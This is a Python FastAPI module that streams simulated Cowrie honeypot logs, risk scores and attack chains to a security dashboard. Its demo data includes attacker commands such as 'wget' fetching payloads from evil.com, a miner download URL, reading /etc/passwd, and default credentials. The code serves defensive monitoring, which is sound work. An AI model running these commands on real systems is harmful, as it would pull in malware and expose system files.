import logging
import random
import json
import asyncio
from datetime import datetime, timezone
from typing import AsyncGenerator
from fastapi import APIRouter, Request
from fastapi.responses import StreamingResponse

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/dashboard", tags=["dashboard"])

# ── demo data pools ────────────────────────────────────────────────────────────

_SAMPLE_IPS = [
    "185.220.101.47", "45.33.32.156", "192.168.1.100",
    "10.10.10.5", "198.51.100.22", "203.0.113.99",
]

_SAMPLE_USERS = ["root", "admin", "ubuntu", "pi", "oracle", "test", "guest"]
_SAMPLE_PASSWORDS = ["123456", "password", "admin", "letmein", "qwerty", "toor", "raspberry"]

_COWRIE_EVENTS = [
    {"eventid": "cowrie.session.connect",   "message": "New connection"},
    {"eventid": "cowrie.login.failed",      "message": "Login attempt failed"},
    {"eventid": "cowrie.login.success",     "message": "Login succeeded"},
    {"eventid": "cowrie.command.input",     "message": "Command input", "input": "whoami"},
    {"eventid": "cowrie.command.input",     "message": "Command input", "input": "wget http://evil.com/payload.sh -O /tmp/p.sh"},
    {"eventid": "cowrie.command.input",     "message": "Command input", "input": "cat /etc/passwd"},
    {"eventid": "cowrie.command.input",     "message": "Command input", "input": "uname -a"},
    {"eventid": "cowrie.session.file_download", "message": "File downloaded", "url": "http://185.220.101.47/miner"},
    {"eventid": "cowrie.session.closed",    "message": "Connection closed"},
    {"eventid": "cowrie.direct-tcpip.request", "message": "TCP tunnel request"},
]

_ATTACK_CHAINS = [
    {
        "chain_id": "CHN-001",
        "attacker_ip": "185.220.101.47",
        "steps": [
            {"step": 1, "event": "cowrie.session.connect",   "desc": "Initial connection"},
            {"step": 2, "event": "cowrie.login.failed",      "desc": "Brute-force attempt (×12)"},
            {"step": 3, "event": "cowrie.login.success",     "desc": "Credential match: root/toor"},
            {"step": 4, "event": "cowrie.command.input",     "desc": "Ran: wget http://evil.com/miner"},
            {"step": 5, "event": "cowrie.session.file_download", "desc": "Downloaded malware payload"},
        ],
        "technique": "T1110 – Brute Force → T1105 – Ingress Tool Transfer",
        "severity": "critical",
    },
    {
        "chain_id": "CHN-002",
        "attacker_ip": "45.33.32.156",
        "steps": [
            {"step": 1, "event": "cowrie.session.connect",   "desc": "Initial connection"},
            {"step": 2, "event": "cowrie.login.success",     "desc": "Default cred: admin/admin"},
            {"step": 3, "event": "cowrie.command.input",     "desc": "Ran: cat /etc/passwd"},
            {"step": 4, "event": "cowrie.command.input",     "desc": "Ran: id && uname -a"},
        ],
        "technique": "T1078 – Valid Accounts → T1087 – Account Discovery",
        "severity": "high",
    },
    {
        "chain_id": "CHN-003",
        "attacker_ip": "198.51.100.22",
        "steps": [
            {"step": 1, "event": "cowrie.session.connect",   "desc": "Port scan detected"},
            {"step": 2, "event": "cowrie.login.failed",      "desc": "SSH brute-force (×34)"},
        ],
        "technique": "T1046 – Network Service Discovery → T1110 – Brute Force",
        "severity": "medium",
    },
]

# ── helpers ────────────────────────────────────────────────────────────────────

def _now() -> str:
    return datetime.now(tz=timezone.utc).strftime("%H:%M:%S")

def _make_event(base: dict) -> dict:
    e = {**base}
    e["src_ip"]    = random.choice(_SAMPLE_IPS)
    e["username"]  = random.choice(_SAMPLE_USERS)
    e["password"]  = random.choice(_SAMPLE_PASSWORDS)
    e["session"]   = f"sess-{random.randint(10000,99999)}"
    e["timestamp"] = _now()
    return e

def _sse(payload: dict) -> str:
    return f"data: {json.dumps(payload)}\n\n"

async def _guard(request: Request) -> bool:
    return await request.is_disconnected()

# ── endpoint 1: live logs ──────────────────────────────────────────────────────

@router.get("/live-logs")
async def stream_live_logs(request: Request):
    async def gen() -> AsyncGenerator[str, None]:
        while not await _guard(request):
            event = _make_event(random.choice(_COWRIE_EVENTS))
            yield _sse({"type": "live_log", **event})
            await asyncio.sleep(random.uniform(0.8, 2.5))
    return StreamingResponse(gen(), media_type="text/event-stream")

# ── endpoint 2: risk scores ────────────────────────────────────────────────────

_RISK_MAP: dict[str, int] = {
    "cowrie.session.connect":        10,
    "cowrie.login.failed":           40,
    "cowrie.login.success":          75,
    "cowrie.command.input":          60,
    "cowrie.session.file_download":  95,
    "cowrie.direct-tcpip.request":   80,
    "cowrie.session.closed":          5,
}

_RISK_LABEL = {
    range(0,  30):  ("Low",      "#22c55e"),
    range(30, 60):  ("Medium",   "#f59e0b"),
    range(60, 80):  ("High",     "#f97316"),
    range(80, 101): ("Critical", "#ef4444"),
}

def _risk_label(score: int) -> tuple[str, str]:
    for r, (label, colour) in _RISK_LABEL.items():
        if score in r:
            return label, colour
    return "Unknown", "#6b7280"

@router.get("/risk-scores")
async def stream_risk_scores(request: Request):
    async def gen() -> AsyncGenerator[str, None]:
        while not await _guard(request):
            event = _make_event(random.choice(_COWRIE_EVENTS))
            base_score = _RISK_MAP.get(event["eventid"], 30)
            jitter     = random.randint(-8, 8)
            score      = max(0, min(100, base_score + jitter))
            label, colour = _risk_label(score)
            yield _sse({
                "type":      "risk_score",
                "eventid":   event["eventid"],
                "src_ip":    event["src_ip"],
                "score":     score,
                "severity":  label,
                "colour":    colour,
                "timestamp": _now(),
                "session":   event["session"],
            })
            await asyncio.sleep(random.uniform(1.0, 3.0))
    return StreamingResponse(gen(), media_type="text/event-stream")

# ── endpoint 3: multi-step attack chains ───────────────────────────────────────

@router.get("/attack-chains")
async def stream_attack_chains(request: Request):
    async def gen() -> AsyncGenerator[str, None]:
        while not await _guard(request):
            chain = random.choice(_ATTACK_CHAINS)
            yield _sse({"type": "attack_chain", **chain, "detected_at": _now()})
            await asyncio.sleep(random.uniform(6.0, 12.0))
    return StreamingResponse(gen(), media_type="text/event-stream")
